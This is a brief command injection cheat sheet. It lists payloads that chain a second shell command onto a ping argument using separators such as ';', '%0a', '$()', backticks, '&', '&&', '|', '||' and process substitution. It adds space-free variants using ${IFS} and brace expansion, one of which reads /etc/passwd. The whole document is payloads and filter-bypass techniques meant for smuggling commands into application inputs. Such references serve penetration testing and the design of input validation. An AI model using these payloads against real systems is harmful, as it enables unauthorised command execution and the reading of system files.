# Command Injection

## 1) Semicolon
```
ping -c1 127.0.0.1 ; echo injection
```

## 2) New line
```
ping -c1 127.0.0.1 %0a echo injection
```

## 3) $()
```
ping -c1 127.0.0.1 $(echo 1 > /tmp/test)
```

## 4) ``
```
ping -c1 127.0.0.1 `echo 1 > /tmp/test`
```

## 5) &
```
ping -c1 127.0.0.1 %26 echo injection # %26 -> &
```

## 6) && - AND
First part need to success
```
ping -c1 127.0.0.1 %26%26 echo injection # %26 -> &
```

## 7) |
```
ping -c1 127.0.0.1 | echo injection
```

## 8) || - OR
First part need to fail
```
ping -c1 || echo injection
```

## 9) Process substitution
```
ping -c 127.0.0.1 <(echo 1 > /tmp/test)
```

# Commands without spaces

## 1) Simple
```
cat</etc/passwd
```

## 2) IFS
```
ls${IFS}-la
```

## 3) {}
```
{ls,-la}
```
